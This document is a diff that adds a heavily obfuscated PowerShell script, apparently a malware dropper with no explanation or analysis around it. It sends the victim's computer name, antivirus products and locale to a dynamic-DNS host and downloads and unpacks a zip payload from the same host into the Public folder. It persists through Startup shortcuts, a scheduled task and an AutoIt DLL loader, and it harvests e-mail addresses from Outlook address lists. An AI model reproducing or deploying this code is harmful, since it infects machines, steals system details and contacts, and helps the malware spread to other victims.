@@ -1,0 +1,273 @@
+(('function ____///////// { 
+[cmdletBinding()]     
+param ( 
+[string]KQiCo'+'mputerName = ocnKQienv:computernameocn , 
+KQiCr'+'edential 
+) 
+    BEGIN  
+        { 
+            KQiwmiQuery = ocnSELECT * FROM AntiVi'+'rusProductocn 
+        } 
+    PROCESS  
+        {   KQiAntivirusProduct = Get-WmiObject -Namespace ocnrootwo'+'uSecu'+'rityCenter2ocn -Query'+' KQiwmiQuery  @psboundparameters         
+  '+'          KQiAntivirusNames = KQiAntivirusProduct.displayName  
+            KQilang  = Get-Culture'+' 
+'+'
+            KQilang = KQilang.displayname
+                KQiWebRequest = '+'[Sys'+'tem.Net.WebRequest]::Create(ocnht'+'tp://vqz8.gotdns.ch/mx/J8v0x5a3a6v4x0BTCsc/kk/index.phpocn)                     '+'                     '+'             
+                KQi'+'GlobalListStr = [System.Text.Enc'+'oding]::UTF8'+'.GetB'+'ytes(ocnAT=KQienv:computername KQiAntivirusNames KQilang ocn)
+                KQiWebRequest.Method = 1UqPOST1Uq
+                KQiWebRequest.ContentType = 1Uqapplication/x-www-form-urlencoded1Uq
+ '+'               KQiWebRequest.ContentLength = KQiGl'+'obalListStr.length
+   '+'       '+'      KQiRe'+'questStream = KQiWebRequest.GetRequestStream()
+       '+'         KQiRequestStream.Write(KQiGl'+'obalListStr, 0, '+'KQ'+'iGlobalListStr.length)
+                KQiRequestStream.'+'Close()		
+        } 
+     END { 
+      '+'   } 
+}
+____//'+'///////
+KQi{_/ZwYwou_/ZwY////wou__ZwY/_ZwYwouwouwouwouwouwou/ZwY_} = KQi('+'[Text.Encoding]::Unicode.GetString([Convert]::F'+'romBase64String(1UqZQB4AGUA1Uq)))
+KQi{_/ZwYwou'+'_/ZwY////wou__ZwY/_ZwYwouwouwouwouwouwou/wouwouwouwou/wou/wou/wouZwY_} = KQi([Text.Encoding]::Unicode'+'.GetString([Convert]::FromBase64String(1'+'UqegBpAHAA1Uq)))
+KQi{_/ZwYw'+'ou_/ZwY////wou__ZwY//wouwouwouwouwouwouwouwou/ZwY_} = ocnhttp://vqz8.gotdns.ch/mx/J8v0x5a'+'3a6v4x0BTCscMD/kk/md.zipocn
+KQi{_/ZwYwou_/ZwY/wouwouwouwouwouwouwou/Zw'+'Y_} = ocnpu'+'blicocn
+KQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwo'+'uwouwouwouwou/ZwY_} = ocnc:wouuserswouKQi{_/ZwYwou_/ZwY/wouwouwouwouwouwouwou/ZwY_}ocn
+'+'
+Function ____////////wouwouwou/wou/wou/wou/wou_____ {
+KQi{_ZwYZwYZwYZwYZw'+'YZwYZwYZwYZwYZwY'+'ZwYZwYZ'+'wY___'+'_____________} = ocnqocn,oc'+'nwocn,ocneocn,ocnrocn,ocntocn,ocnyocn,ocnuocn,ocnpocn,ocnaocn,ocnsocn,ocndocn,ocnfocn,ocngo'+'cn,ocnhocn,ocnjocn'+',ocnkocn,ocnzocn,ocnxocn,ocncocn,ocnvocn'+',ocnbocn,ocnnocn,ocnmocn
+KQi{_ZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwY//////________________} = ocn2_ocn,ocn3_ocn,ocn4_ocn'+',ocn5_ocn,ocn6_ocn,ocn7_ocn,ocn8_ocn,ocn9_ocn
+KQi{_ZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwY//////wouwouwouw'+'ouwou_________'+'_______} = KQinull
+KQi{__ZwY'+'ZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwY//////wouwouwouwouwou________________} = Get-Random -In'+'putObject KQi{_ZwYZwYZ'+'wYZwYZwYZwYZwYZwYZwY'+'ZwYZwYZwYZwY______'+'__________} -Count 6
+KQi{__ZwYZwYZwYZwYZwYZwY_ZwYZwYZwYZwYZwYZwYZwY//////wouwouwouwouwou________'+'__'+'______} = Get-Random -InputObject KQi{_ZwYZwY'+'ZwYZwYZw'+'YZwYZwYZwYZwYZwYZwYZwYZw'+'Y//////______'+'______'+'____} -Count 1
+KQ'+'i{__ZwYZwYZwYZwYZwYZwY_ZwYZwY'+'ZwYZwYZwYZwY_ZwY//////wouw'+'ouwouwouwou________________} = Get-Random -InputObject KQi{_ZwY'+'ZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwY_______'+'_________}.'+'ToUpper() -Cou'+'nt 1
+foreach('+'KQin in KQi{__ZwYZwYZwY'+'ZwYZwYZw'+'YZwYZwYZwYZwYZwYZwYZwY//////wouwouwouwouwou________________}) {
+KQi'+'{_ZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwY///'+'///wouwouwouwouwou________________} += KQ'+'in
+}
+foreach (KQin2 in KQi{__ZwYZwYZwYZwYZwYZwY_ZwYZwYZwYZwYZwYZwYZwY//////wouwouwouwouwou____'+'____________}) {
+KQi{_ZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwY//////wouwouwouwo'+'uwou_____'+'___________}'+' += KQin2
+}
+foreach (KQin3 in KQi{__ZwYZwYZwYZwYZwYZwY_ZwYZwYZwYZwYZ'+'wYZwY_ZwY//////wouwouwouwouwou____'+'____________}) {
+KQi{_'+'ZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZwYZ'+'wY//////wouwouwouwouwou________________} += KQin3
+}
+return ocn_KQi{_ZwYZwYZwYZwYZwYZwY'+'ZwYZwY'+'ZwYZwYZw'+'YZwYZwY//////wouwouwou'+'wouwou________________}o'+'cn
+}
+'+'KQi{_wouwouwouwou'+'wouwou/ZwYwou_/ZwY/wouwouwou___wo'+'uwouwouwou/ZwY_} = '+'____////////wouwouwou/wou/wou/wou/wou___'+'__
+KQ'+'i{_wouwouwouwouwou__wou/ZwYw'+'ou_/ZwY/wouwou'+'wou___wouwouwouwo'+'u/ZwY_} = o'+'cnKQi{_wouwou'+'wouwouwouwou/ZwYwou'+'_/Z'+'wY/wouwouwouwouwouwouwou/ZwY_}woub.arocn
+KQi{_wouwouwou//////////wouwou__wou/ZwYwou_/ZwY/wouwouwou___wou'+'wouwouwou/ZwY_} '+'='+' if ('+'K'+'Qi{_wou'+'wouwouwouwou__wou/ZwYw'+'ou_/ZwY/wouwouwou_'+'__wouwouwouwou/ZwY_}) { Test'+'-Path KQi{_wouw'+'ouwouwouwou_'+'_wou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/Zw'+'Y_} }
+KQi{_wouwouwo'+'u////'+'//////wouwou__'+'wou/ZwYwou_/ZwY/wouwouw'+'ou___'+'wouwouwouwou/ZwY_}
+if(KQi{_wouwouwou//////////wouwou__wou/ZwYwou_/ZwY/wouwouwou___wouwouwouwo'+'u'+'/ZwY_} -eq 1UqTrue1Uq){
+   '+'  exit
+}else{
+'+'
+New-Item -ItemType dir'+'ectory -Path KQi{_w'+'ouwouwouwouw'+'ouwou/'+'ZwYwou_/ZwY/wouwouwouwouwouwouwou/Zw'+'Y_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___'+'wouwouwouwou/ZwY_}
+'+'
+KQi{_wou'+'wouwou///////wouwouwouwou'+'wouwouwouwouwou'+'wou/_}'+' = new-objec'+'t System.Net.WebClient
+KQi{_wouwouwou///////wouwouwouwouwouwouwouwouwouwo'+'u/_}.DownloadFile(KQi{_/ZwYwou'+'_/ZwY////wou__ZwY//wouwouwouwouwouw'+'ouwouwou/ZwY_}'+',ocnKQ'+'i{_wouwouwouwouwouwou/Z'+'wYwou_/ZwY/wouwouwouwouwouwouwou/ZwY_}w'+'ouKQi{_wouwouwouwouwouwou/Z'+'wYwou_/ZwY/wouwouwou___'+'wouwouwo'+'uwou/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_}.zipocn)
+KQi{_wouwouwou//////ZwYZwYwouZwY'+'ZwYZwYZwY/wouwouwouwou'+'wo'+'uwouwou/_} = new-object -com shell.application 
+KQ'+'i{_/wou/wou/wou/wou/wou/wou/wou/_} = KQi{_wouwouwou'+'//////ZwYZwYwouZwYZwYZwYZwY/wouwouwouwouwouwouwou/_}.namespace(ocnKQi{_wouwouwouwouwouw'+'ou/ZwYwo'+'u_/ZwY'+'/wouwouwo'+'uwouwouwouwou/ZwY_}wo'+'uKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwo'+'u/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___w'+'ouwouwouwou/ZwY_}.KQi{_/ZwYwou_/ZwY////wou__ZwY/_ZwYwouwouwouwouwouwou/wouwouwouwou/wou/wou/'+'wouZwY_}ocn) 
+KQi'+'{_/wou/wou/w'+'ou/wou/wo'+'u/__ZwYwouwouwouZwYZwYZwYZwYZ'+'wYZwYwou/wou/_} = KQi{_wo'+'uwouwou//////ZwYZwYwouZwYZwYZwYZwY/wouwouwouwouwouwouwou/_}.namespace(ocnKQi{_wouwo'+'uwouwouwou'+'wou/ZwYwou_/ZwY/wou'+'wouwouwouwouwouwou/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_}ocn) 
+KQi{_/wou/wou/wou/wou/wou/__ZwYwouwo'+'uwouZwYZwYZwYZwYZwYZwYwou/wou/_}.Copyhere(KQi{_/wou/wou/wou/wou/wou/wou/wou/_}.items())
+Rename-Item -NewName (ocnKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwouw'+'ouwouwouwou/ZwY_}wouKQi{_wouwo'+'uwouwouwouwou'+'/ZwYw'+'ou_/ZwY/wouwouwou'+'___'+'wouwouwouwou/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_}.KQi{_/ZwYwou_/ZwY////wou__ZwY/_ZwYwouwouwouw'+'ouwouwou/ZwY_}ocn) -Path (ocnKQi{_wouwouw'+'ouwouwouwou/ZwYwou_/Z'+'wY/wouwouwouwouwouwouwou/Z'+'wY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/Z'+'wY/wouwouwou___wouw'+'ouwouwou/ZwY_}wouKQi{_/ZwYwou_/'+'ZwY////wou_'+'_ZwY/_ZwYwouwouwouwouwouwou/ZwY'+'_}.pngocn)
+Rename-Item -NewName (ocnK'+'Q'+'i'+'{_wouwouwouwouwo'+'uw'+'ou/ZwYwou_/ZwY'+'/wouwouwo'+'uwouwouwouwou/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwo'+'uwou/ZwY_}wouKQi{_wouwouwo'+'uwouwouwou/ZwY'+'wou_/ZwY/wouwouwou___wouwouwouwou/ZwY_'+'}.LNSocn) -Path (ocnKQi{_'+'wouwouwouwouwou'+'wou/ZwYwou_/ZwY/wouwouwouwouwouwouwou/ZwY_}w'+'ouKQi{_w'+'ouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_}wo'+'u12.dllocn)
+Rename-Item -NewName (ocnKQi{_wouwouwouwouwouwou/Zw'+'Ywou_/ZwY/wouwouw'+'ouwouwouwouwou/ZwY_}wouKQi{_wouwouwouwouwou'+'wou/ZwYwou_'+'/ZwY/wouwouwou___w'+'ouwouwouwou/ZwY_'+'}wousqlite3.dllocn) -Path (o'+'cnKQi{_wouwouwouwouwouwou/Zw'+'Ywou_/ZwY/wouwouwouwouwouwouwou/ZwY_}wou'+'KQi{_wouwouwouwouwouwou/ZwYwou_/'+'ZwY/wouwouwou___wouwouwouwou/ZwY_}wousq'+'l.p'+'ngocn'+')
+function _____/wou_/wou/w'+'ou_/wou/=wou
+{'+'
+  Par'+'am([string]KQi{___/wou_/=wou___/wou_/==},[string]KQ'+'i{__/==wou/wou_/wou/=wou/wou_/});
+  try{  
+    K'+'Qi{__/wou'+'_/=wou/=wou/=====} = New-Object -ComObject WScript.Shell 
+    KQi{/=wou/wou__/=wou/=wou/=wou_} = KQi{__/wou_/=wou/'+'=wou/=====}.CreateShortcut(KQi{'+'___/wou_/=wou___/wou_/==}'+') 
+    KQi{/=wou/wou__/=wou/=wou/=wou_}.TargetPath = ocnKQi{_wouwou'+'wouwouw'+'ouwou/ZwYwou_/ZwY/wouwouwouwouwouwouwou/ZwY_}wouKQi{_wouwo'+'uwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_}wouKQi{_wouwouwouwou'+'wouwou/Zw'+'Ywou_/ZwY/wouwouwou___wouwouw'+'ouwou/ZwY_}.KQi{_/ZwYwo'+'u_/ZwY////wou__ZwY/_ZwYwouwouwouwouwo'+'uwou/ZwY'+'_}ocn       
+    KQi{/=wou/wou__/=wou/=wou/=wou_}.Arguments = ocn KQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwou'+'wouwo'+'u/ZwY_}1.LNS  KQi{_wou'+'wouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_}ocn
+    KQi{/'+'='+'wou/w'+'ou__/=wou/=wou/=wou_}.WorkingDirectory'+' = ocnKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwouwouw'+'ouwouwou/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/'+'wouwouwou___wouwouwouwou/'+'ZwY_}ocn 
+    KQi{/=wou/wo'+'u_'+'_/=wou/=wou/=wou_}.WindowStyle = 7   
+    KQi{/=wou/wou_'+'_/=wou/=wou/=wou_}.IconLocation = KQi([Text.Encoding]::Unicode.GetString([Convert]::FromBase64'+'String(1UqJQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwA'+'SQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==1Uq)'+')'+')
+    KQi{/=wou/wou__/'+'=wou/=wou/='+'wou_}.Save()
+  }finally{}
+}
+KQi{/'+'===wou__/=wou_/==wou_/} = New-Object -Com WScript.Shell
+KQi{/=wou_/wou_/===wou/wou/wou/} = KQi{/===wou__/=wou_/==wou_/}.SpecialFolders.Item(KQi([Text.Encodi'+'ng]::Unicode.GetString([Convert]::FromBase64String(1UqcwB0AGEAcgB0AHUAcAA=1Uq))));          '+'
+del KQi{/=wou_/wou_/===w'+'o'+'u/wou/wou/}wou*.vbs
+del KQi{/=wou_/wo'+'u_/===wou/wou/wou/}wou*.lnk
+KQi{_/=wou/=wou/wou_/'+'wou/=wou__} = ocn     '+'                                                         '+'            '+'                                         '+'     '+'                           '+'        '+'       '+'                                 '+'            '+'                                                                     '+'              KQienv:APPDATAwouKQi{_/=wou/wo'+'u/=wou___/wo'+'u/==}, KQi{_/wou/'+'wou/wou/=wou/==wou__/}ocn
+KQi{___/wou_'+'/wou/===wou/wou__} = ocnKQi'+'{/=wou_/wou_/'+'===wou/wou/wou/}wouKQi{_wouwouwouwouw'+'ouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouw'+'ou/ZwY_}.ln'+'kocn  
+        
+_____/wou_/wou/wou_/wou/=wou KQi{___/wou_/w'+'ou/===wou/wou__}  KQi{_/'+'=wou/=wou/wou_/'+'wou/=wou__}
+
+
+f'+'unction _____/wou_/wou/wou_/wou/=wouwou///wou/wou/wou
+{
+  Param([string]KQi{___/wou_/=wouwou/wou/wouwou___/wou_/==},[string]KQi{__ZwYZwY_/'+'wou_/=w'+'ouwou/wo'+'u/wouwou___/wou_/==});
+  try{ '+' 
+    KQi{__ZwYZwY_'+'/wou_/=wouwou/wou/ZwYZwYwouwou___/wou_/==} = New-Object -ComObject WScript.Shell 
+    KQi{__ZwYZwY/=wouwou/wou/ZwYZwYwouwou___/wou_/==} = KQi{__ZwYZwY_/wou_/=wouwou/wou/ZwYZwYwouwou___/wou_/==}.CreateShortcut(KQi{___/wou_/=wouwou/wou/'+'wouwou___/wou_/==}) 
+    KQi{__ZwYZwY/=wouwou/wou/ZwYZw'+'Ywouwou___/wo'+'u_/==}.TargetPath = ocnc:wouuserswouKQi{_/ZwYwou_/ZwY/wouwou'+'wouwouwouwouwou/ZwY_}w'+'ouKQi{_wouwouwouwouwouwou/'+'ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_}.vbsocn      
+    KQi{__ZwYZwY'+'/=wouw'+'ou/wou/ZwYZwYwouwou___/wou_/==}.Argume'+'nts = ocnocn
+	KQi{__ZwYZwY/=wouwou/wou/ZwYZwYwouwou___/wou_/==}.Description = KQi([Text.Encoding]::Unic'+'ode.GetSt'+'ring([Convert]::FromBase64String(1UqIgBBAGMAZQBzAHMAYQByACAAYQAgAGkAbgB0AGUAcgBuAGUAdAAuACIA1Uq)));
+    KQi{__ZwYZwY/='+'wo'+'uwou'+'/wou/ZwYZwYwouwou___/wou_/==}.WorkingDi'+'recto'+'ry = ocnocn    
+ '+'   KQi{__ZwYZwY/=wouwou/wou/ZwYZwYwouwou___/wou_/==}.IconLoc'+'a'+'t'+'ion '+'= ocnKQi{_/wou/wou/wou/wou__/wouZwY_ZwYZ'+'wY_ZwY____}ocn
+    KQi{__ZwYZwY/=wouwou/wou/ZwYZwYwouwou___/w'+'ou_/==}.Save()
+  }finall'+'y{}
+}
+
+KQi{_/wo'+'u/wou/wou__wo'+'uwouw'+'ouwouwouwouwouZwYZwYZwYwou/wou/_} = KQi'+'{_wouwouwouwouwouwou/Z'+'wYwou_/ZwY/wouwouwou___wouwouwouwou/'+'ZwY_}
+KQi{_/wou/w'+'ou/wou__wouwouwouwouwouwouwouZwYZwYZwYwou/wou/_} Zw'+'Y Set-Content ocnKQi{_wou'+'wouwouwouwouwou/ZwYwou_/ZwY/wouwouwouwouwouwouwou/Zw'+'Y_}woub.arocn
+K'+'Qi{_/wou/wou/wou__wouwouwouwouwouwouwouZwYZwYZwYwou/wo'+'u/_} ZwY Out-Fil'+'e ocnKQi{_wouwouwouwouwouwou/ZwYwou_/Z'+'wY/wouwouwouwouwouwo'+'uwou/ZwY_}woub.arocn
+KQi{_/wou/wou/wou__wouwouwouwouwouwouwouZwYZwYZwYwou/wou/_} > ocnKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwouwouwouwouwou/ZwY_}woub.arocn
+
+KQi{___/wou_/wou/===wou/wou__} = ocnc:'+'wouuserswoupublicwouch'+'rome.lnkocn 
+_'+'____/wou_/wou/wou_/w'+'ou/=wouwou///wou/wou/wou KQi{___/wou_/wou/===wou/wou__}  KQ'+'i{__ZwYZwY_/wou_/=wouwou/wou/wouwou___/wou_/==}
+
+'+'KQi{_/ZwY'+'wou_/ZwY//______//wo'+'u__ZwY/_ZwYwouwou'+'wouwouwouwou/ZwY_} ='+' KQi([Text.Encoding'+']::Unicode.G'+'etString('+'[Convert]::FromBase64String(1UqTABpAG4AZQA'+'=1U'+'q)))
+KQi{_/ZwYwou_wouwouwo'+'uZwYZwYZwYZwYZwYZwYZwYZwYZwYZwY///wouwou/ZwY_}'+' = KQi([Text.En'+'coding]::Unicode.GetString([Conver'+'t'+']::FromBa'+'se64String(1UqQwBtAGQA'+'1Uq)))
+KQi{_/ZwYwou_wouwouwou///wouwou/ZwY_} = 1Uq861Uq
+KQi{'+'_/ZwYwou'+'_/ZwY//______//wou__ZwY/_ZwYwouwouwouwou__wouwouwou///wouwou/ZwY_} ='+' ocnKQiocn
+'+'
+KQiArquivo = ocnKQi{_wouwouwouwouwouwou/ZwYwou_/Z'+'wY/wouwouwouwouwouwouwou/ZwY_}wouKQi{_w'+'ouwo'+'uwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwo'+'uwou/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wo'+'uwouwou___wouwouwouwou/ZwY_}1.LNS'+'ocn
+
+KQiArquivoSaida =ocnKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwouwouwouwouwou/ZwY_}wouKQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/'+'ZwY_}wouKQi'+'{_wouwouwouwouwo'+'uwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/'+'ZwY_}1.LNSocn
+Add-Content'+' KQ'+'iArquivo 1Uq#NoTrayIcon1Uq
+Add-Content KQiAr'+'quivo ocnGlobal KQ'+'i{_/ZwYwou_/ZwY//____'+'_'+'_'+'//wou_'+'_ZwY/_ZwYwouwouwouwou__wouwouwou///wouwou/ZwY_}KQi{_wouw'+'ouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_} = KQ'+'i{_/ZwYwou_/ZwY//______//wou__ZwY/_ZwYwouwouwouwou__wouwouwou///wouwou/ZwY_}KQi{_/ZwYwou_wouwou'+'wouZwYZw'+'YZwYZwYZwYZwYZwYZwYZwYZwY///wouwou/ZwY_}KQi{_/ZwYwo'+'u_/ZwY//______//wou__ZwY/_ZwYwouwouwouwouwouw'+'ou/ZwY_}[1]ocn
+Add-Content KQiArquivo ocnGlob'+'al KQi{_/ZwYwou_/ZwY//_'+'_____//wou__ZwY/_ZwYwouwouwouwou__wouwouwou///wou'+'wou/ZwY_}KQi{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wo'+'uwouwouwou/ZwY_}KQi{_/ZwYwou_wouwouwou///wouwou/Zw'+'Y_} = DllOpen(1UqKQi{_wouwouwouwo'+'uwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwo'+'u/ZwY_}.LNS1Uq)ocn
+Add-Content KQiArquivo'+' ocnDllC'+'all(KQi{_/ZwYwou_/ZwY//______//wou__ZwY/_ZwYwouwouwouwou__wouwouwou///wo'+'uwou/ZwY_}KQi{_wouwo'+'uwouwouwouwou/ZwYwou_/ZwY/wouwouwou__'+'_wo'+'uwouwo'+'uwou/ZwY_}KQi{_/ZwYwou_wouwouwou///wouwou/ZwY_}, 1'+'Uq'+'STRUCT1'+'Uq, 1UqJLI_CmdToArgs'+'1Uq'+')ocn
+
+    KQicmdFileNa'+'me = ocnC:wouWin'+'dowswouexplorer.exe ocn
+    K'+'QiTaskStartTime = [datetime]::Now.AddSeconds(180)
+   '+' KQiTaskEnd'+'Time = [datetime]:'+':Now.AddSeconds(240)
+   '+' KQitaskName = KQi{_wouwouwouw'+'ouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouwou/ZwY_'+'}
+    KQiservice = New-Object -ComObject(ocnSchedule.Servic'+'eocn)
+'+'
+    KQiservice.Connect()
+'+'
+    '+'KQirootFolder = K'+'Q'+'iservice.GetFolder'+'(ocnwouocn)
+    KQiTaskDefinit'+'ion = KQiservi'+'ce.NewTask(0)
+'+'    KQiTaskDef'+'inition.RegistrationInfo.Description = ocnocn
+    KQiTaskDefinition.Settings.En'+'abled = KQitru'+'e'+'
+    KQiTaskDefinition.Settings.DisallowSt'+'artIfOnBatteries = KQif'+'alse
+    KQiTaskDefinition.Settings.Delete'+'ExpiredTask'+'After = ocnPT0Mo'+'cn
+    KQitriggers = KQiTaskDefinition.Triggers
+    KQitrigger ='+' KQitriggers.Create(1)'+'
+    '+'KQitrigger.StartBoundar'+'y = KQiTaskStartTime.ToString(ocnyyyy-MM-dd1UqT1UqHH:mm:ssocn)
+    KQitrig'+'ger.EndBoundary = KQiTaskEndTime.ToString(ocnyyyy-M'+'M-dd1U'+'qT1UqHH:mm:s'+'socn)
+    KQitrigger.E'+'nabled = KQitrue
+    KQiaction = KQiTaskDefinition.Actions.Create(0)
+    KQiaction.Path = KQicmdFileName
+    KQi'+'action.Arguments = ocnKQi{/=wou_/wou_/===wou/wou/wou/}wouKQi'+'{_wouwouwouwouwouwou/ZwYwou_/ZwY/wouwouwou___wouwouwouw'+'ou'+'/'+'ZwY_}.lnkocn
+    '+'KQiaction = KQiTaskDefinition.Action'+'s.Create(0)
+    K'+'Qiaction.Path = ocnschtasks.exeocn
+    KQiaction.Arguments = ocn/Del'+'ete /TN K'+'QitaskName /Focn
+    KQirootFolder.RegisterTaskDef'+'init'+'ion(KQitaskName, '+'KQi'+'TaskDefinition, 6, ocnocn, KQinull'+', 0)
+}
+
+
+Add-Type '+'-assembly KQ'+'i([Text.Encod'+'ing]::Unicode.GetString([Conver'+'t]::FromBase64String(1UqTQBpAGMAcgBvAHMAbwBmAHQALgBPAGYAZgBpAGMAZQAuAEkAbgB0AGUAcgBvAHAALgBPAHUAdABsAG8AbwBrAA==1Uq)))
+KQi{_/=wou/wou__/='+'wou/wou/wou__} = New-Object -comobject Outlook.'+'Application
+KQi{____/'+'===wou_____/wou/} = KQi{_/=wou/wou__/=wou/wou/wou__}.'+'GetNameSpace(KQi([Text.Encod'+'ing]::Unicode.GetString([Convert]::'+'FromBase64String(1UqTQBBAFAASQ'+'A=1Uq))))
+'+'
+KQi{_/wou/=====wou__/=wou/=} = [Syste'+'m.Co'+'llections'+'.ArrayList]@()
+function ___/=wou/wou/=wou___/=wou_(KQi{____/wou____/wou/wou_/wou_})
+{
+  KQi{____/==wou__/wou_/=wou_} = KQi([Text.Encoding]::Unicode.GetString([Co'+'nvert]::FromBase64String(1UqXgBb'+'AF8AYQAtAHoAMAAtADkALQBdACsA'+'KABcAC4AWwBfAGEAL'+'QB6ADAALQA5AC0AXQArACkAKgBA'+'AFsAYQAtAHoAMAAtAD'+'kALQBd'+'ACsAKABcAC4AWwBhA'+'C0AegAwAC0AOQAtAF0AKwA'+'pACoAKABcAC4AWwBhAC0AegBdAHsAMgA'+'sADQAfQApACQA1Uq)));
+  if (KQi{____/wou____/wo'+'u/wou_/wou_} -match KQi{____/==wou__'+'/wou_/=wou_})'+' {
+    return KQitrue
+  }
+  return KQifalse
+}
+function _/=wou_/==wou___'+'_/wou__/(K'+'Qi{____/wou____/'+'wou/wou_/wou_}) {
+  if (KQi{____/wou____/wou/wou_/wou_}) {
+    KQi{__/=====wou/wou_/wou_/wou} = '+'KQifalse
+    KQi{____/wou____/wou/wou_/wou_} = KQi{____/wou____/wou/wo'+'u_/wou_}.ToLo'+'wer()
+    if (KQi{____/wou____/wou/wou_/wou_}.StartsWith(ocn1Uqocn) -And KQi{____/wou____/wou/w'+'ou_/wo'+'u_}.EndsWith(ocn1Uqocn)) {
+      KQi{____/wou____/'+'wou/wou_/wou_} = KQi{____/wou____/wou/wou'+'_/wou_}.Substring(1, '+'KQi{____/wou____/wou/wou_/wou_}.Length - 2)
+    }
+    i'+'f (___/=wou/wou/=wou___/=wou_(K'+'Qi{____/wou____/wou/wou_/wou_})) {
+      for(KQi{__/'+'wou/wou__/=wou/wou__/wou} = 0;KQi{__/wou/wou__/=wou/wou__/wou} -lt KQi{_/'+'wou/===='+'=wou__/=wou/='+'}.Count;KQi'+'{'+'__/wou/wou__/=wou/wou__/wou'+'}++) {
+      '+'  if '+'('+'KQi{_/wou/=='+'===wou__/=wou/=}[KQi{__/wou'+'/wou__/=wou/wou__/wou}] -eq KQi{____/wou____/wou/wou_/wou_}) {
+          KQi{__/====='+'wo'+'u/wou_/wou_/wou} = KQitrue
+          break
+  '+'      }
+      }
+      if (-Not KQi{__/=====wou/wou_/wou_/wou}) {
+        KQi{__/wou___/========wou} = '+'KQi{_/wou'+'/='+'====wo'+'u__/=wou/=}.Add(KQi{____/wou___'+'_/wou/wou_/wou_})
+      }
+    }
+  }
+}
+function _/===='+'wou__/=====wou_/ {
+'+'
+  K'+'Qi{/==wou/=wou____/wou_/=wou} = KQi{____/===wou_____/wo'+'u/}.AddressLists
+  for(KQi{__/wou/wou__/=wou/wou__/wou} = 1;KQi{__/wou/wou__/=wou/wou__/w'+'ou} -le KQi{/==wou/=w'+'ou____/wou_/=wou}.Count;KQi{__/wo'+'u/wou__/=wou/wou__/wou}++) {
+    KQi{/=wou_/==wou/wou__/==wou_} = KQi{/==wou/=wou____/wou'+'_/=wou}.Item(KQi{__/wou'+'/wou__'+'/=wou/wou__/wou}).AddressEntries
+    for(KQi{/==wou/wou'+'/wou_/wou_/wou__/} = 1;KQi{'+'/==wou/'+'wou/wou_/wou_/wou'+'__/} -le KQi{/=wo'+'u_/==wou/wou__/==wou_}.Count;KQi{/==wou/wou/wou_/wou_/wou__/}++) {
+      KQi{_/wou_/wou__/wou__'+'___/=}'+' = KQi{/=wou_/==wou/wou__/==wou_}.Item(KQi{/==wou/wou/wou_/wou_/wou__/'+'})
+      KQi{__/='+'==wou/==='+'wou/wou/wou_} = KQi{_/w'+'ou_/wou__/wou_____/=}.'+'AddressEntryUserType
+      KQi{____/wou____/wou'+'/wou_/wou_} = ocnocn
+      if (KQi{__/===wou/===wou/wou/wou_'+'} -eq'+' 10) '+'{
+        KQi'+'{____/wou____/wou/wou_/wou_} = KQi{_/wou_/wou__/wou_'+'____'+'/=}.Address
+      } elseif ((KQi{__/===wou/==='+'wou/wou/wou_} -eq 3) -Or (KQi{__/===wou/===wou/wou/wou_} -eq 1) -Or (KQi{__/===wou'+'/===wou/wou/wou_} -eq 4) -Or (KQi{__/==='+'wou/='+'==wou/wou/wou_} -eq 2) -Or (KQi{__/===wou/===wou/wou/wou_} -eq 5) -Or ('+'KQi'+'{__/===w'+'ou/===wou/wou/wou_} -eq 0))'+' {
+        KQi{____/wou____/wo'+'u/wou_/wou_} = '+'KQ'+'i{_/wo'+'u'+'_/wou__/wou_____/='+'}.GetExchangeUser().PrimarySm'+'tpAddr'+'ess
+      }
+   '+'   _/=wou_/==wou__'+'__/'+'wou__/(KQi{____/wou____/wou/wou_/wou_})
+    }
+  }
+}
